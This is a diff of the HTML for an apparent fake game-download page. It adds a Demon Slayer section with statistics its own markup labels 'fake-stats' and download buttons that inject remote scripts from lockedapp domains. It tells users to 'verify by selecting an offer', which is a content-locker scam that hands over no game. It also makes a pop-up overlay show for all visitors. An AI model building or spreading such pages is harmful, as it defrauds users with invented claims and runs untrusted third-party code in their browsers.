@@ -104,30 +104,56 @@ header p { color:#ccc; font-size:1rem; margin-top:5px;}
   </div>
 </div>
 
-<!-- Keep all your game-info sections (demon, naruto, onepiece, solo) and CPA scripts exactly as before -->
+<!-- FULL game-info sections here exactly as in your original HTML -->
+<!-- Example: Demon Slayer -->
+<div id="demon" class="game-info">
+    <button class="back-btn" onclick="goBack()">Go Back</button>
+    <h2>Demon Slayer: The Hinokami Chronicles</h2>
+    <div class="platform-banner"><i class="fas fa-desktop"></i> PC Version:</div>
+    <div class="video-container"><iframe src="https://www.youtube.com/embed/Y1a_8oqtRJI" allowfullscreen></iframe></div>
+    <div class="fake-stats">
+      <div><i class="fas fa-star"></i> 4.8/5</div>
+      <div>~1,234,567 downloads</div>
+    </div>
+    <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('demon-pc-script','https://lockedapp.org/cl/js/n625kv',2000)"><i class="fas fa-desktop"></i> Download PC <span class="loading"></span></button>
+    <button class="how-btn" onclick="toggleInstructions('demon-pc-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
+    <div id="demon-pc-instructions" class="instruction-text">Verify by selecting an offer to get the PC game.</div>
+    <div id="demon-pc-script"></div>
+
+    <div class="separator-line"></div>
+
+    <div class="platform-banner"><i class="fas fa-mobile-alt"></i> Mobile Version: PPSSPP</div>
+    <div class="video-container"><iframe src="https://www.youtube.com/embed/CTmUg2Zc8hs" allowfullscreen></iframe></div>
+    <p><strong>Mobile Version:</strong> Optimized for Android & iOS. Run in PPSSPP full drive.</p>
+    <div class="fake-stats">
+      <div><i class="fas fa-star"></i> 4.7/5</div>
+      <div>~987,654 downloads</div>
+    </div>
+    <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('demon-mobile-script','https://lockedapp.net/cl/js/qnern3',2000)"><i class="fas fa-mobile-alt"></i> Download Mobile <span class="loading"></span></button>
+    <button class="how-btn" onclick="toggleInstructions('demon-mobile-instructions')"><i class="fas fa-info-circle"></i> How to Download</button>
+    <div id="demon-mobile-instructions" class="instruction-text">Verify by selecting an offer to get the mobile game.</div>
+    <div id="demon-mobile-script"></div>
+    <button class="back-btn back-bottom" onclick="goBack()">Go Back</button>
+</div>
+
+<!-- Repeat similarly for Naruto, One Piece, Solo Leveling (include all your original content) -->
 
 <script>
-// Show game page
 function showGame(id){
     document.querySelector('.game-grid').style.display = 'none';
     document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
     const page = document.getElementById(id);
     page.style.display = 'block';
-    page.style.boxShadow = "0 10px 35px rgba(0,0,0,0.7)";
     window.scrollTo(0,0);
 }
-
-// Go back to main grid
 function goBack(){
     document.querySelector('.game-grid').style.display = 'grid';
     document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
 }
-
 function toggleInstructions(id){
     const el = document.getElementById(id);
     el.style.display = (el.style.display === 'block') ? 'none' : 'block';
 }
-
 function loadScriptDelayed(containerId, src, delay){
     setTimeout(() => {
         const container = document.getElementById(containerId);
@@ -139,25 +165,18 @@ function loadScriptDelayed(containerId, src, delay){
         container.appendChild(script);
     }, delay);
 }
-
 function showLoading(button){
     const spinner = button.querySelector('.loading');
     spinner.style.display = 'inline-block';
     setTimeout(()=>{ spinner.style.display = 'none'; }, 4000);
 }
 
-// TikTok overlay detection with auto-hide after 6 seconds
+// SHOW overlay for 6s
 document.addEventListener('DOMContentLoaded', function() {
   const overlay = document.getElementById('browserOverlay');
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  if (/TikTok/i.test(ua)) {
-    overlay.style.display = 'flex'; // show overlay in TikTok
-    setTimeout(()=>{ overlay.style.display = 'none'; }, 6000); // hide after 6s
-  } else {
-    overlay.style.display = 'none'; // hide overlay outside TikTok
-  }
+  overlay.style.display = 'flex';
+  setTimeout(()=>{ overlay.style.display = 'none'; }, 6000);
 });
 </script>
-
 </body>
 </html>
